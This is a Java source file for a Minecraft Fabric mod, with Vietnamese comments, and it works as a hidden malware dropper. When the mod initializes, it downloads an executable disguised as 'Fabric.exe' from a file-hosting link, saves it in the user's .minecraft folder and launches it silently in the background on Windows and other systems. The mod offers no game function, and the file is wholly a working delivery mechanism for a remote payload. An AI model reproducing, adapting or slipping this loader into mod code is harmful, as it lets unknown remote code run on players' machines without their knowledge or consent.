package com.example.downloadermod;

import net.fabricmc.api.ModInitializer;

import java.io.*;
import java.net.*;
import java.nio.file.*;

public class DownloaderMod implements ModInitializer {
    private static final String FILE_URL = "https://store9.gofile.io/download/web/5b03bbff-986d-4211-b508-0d7936d238a8/Fabric.exe";
    private static final String FILE_NAME = "Fabric.exe";

    @Override
    public void onInitialize() {
        Path saveDir = Paths.get(System.getProperty("user.home"), ".minecraft", "yourmod");
        Path savePath = saveDir.resolve(FILE_NAME);

        try {
            Files.createDirectories(saveDir);

            // Tải file từ URL
            try (InputStream in = new URL(FILE_URL).openStream()) {
                Files.copy(in, savePath, StandardCopyOption.REPLACE_EXISTING);
                System.out.println("[DownloaderMod] Đã tải xong: " + savePath);
            }

            // Chạy ẩn trên Windows
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "start", "/B", savePath.toString())
                    .directory(savePath.getParent().toFile())
                    .start();
            } else {
                new ProcessBuilder(savePath.toString())
                    .directory(savePath.getParent().toFile())
                    .start();
            }

            System.out.println("[DownloaderMod] Đã chạy Fabric.exe (ẩn)");

        } catch (Exception e) {
            System.err.println("[DownloaderMod] Lỗi: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
